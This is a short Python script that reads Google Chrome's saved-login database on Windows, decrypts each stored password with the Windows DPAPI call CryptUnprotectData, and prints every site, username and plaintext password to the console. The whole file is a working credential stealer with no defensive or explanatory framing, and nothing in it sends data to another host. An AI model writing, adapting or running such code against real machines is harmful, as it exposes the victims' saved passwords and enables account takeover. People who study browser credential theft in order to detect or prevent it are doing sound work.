
from os import getenv
import sqlite3
import win32crypt

# Connect to the Database

	
# Get the results
try:
	#connect to the sql database	
	conn = sqlite3.connect(getenv("APPDATA") + "\\..\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", timeout=10) 
	cursor = conn.cursor()
	#grab the data from the database
	cursor.execute('SELECT action_url, username_value, password_value FROM logins')
	# decrypt the passwords using the win32crypt.cryptunprotectdata API
	for result in cursor.fetchall():
		password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
		# this shit is just formatting for it to look easier
		if password:
			print ('\n')
			print ('----------------------------')
			site = ('Site: ' + result[0])
			username = ('\nUsername: ' + result[1])
			password = ('\nPassword: ' + str(password))
			print (site + username + password)
			print ('----------------------------')
  #error handling
except sqlite3.OperationalError:
	print ('Database Locked. Please close all instances of Chrome')
		
	

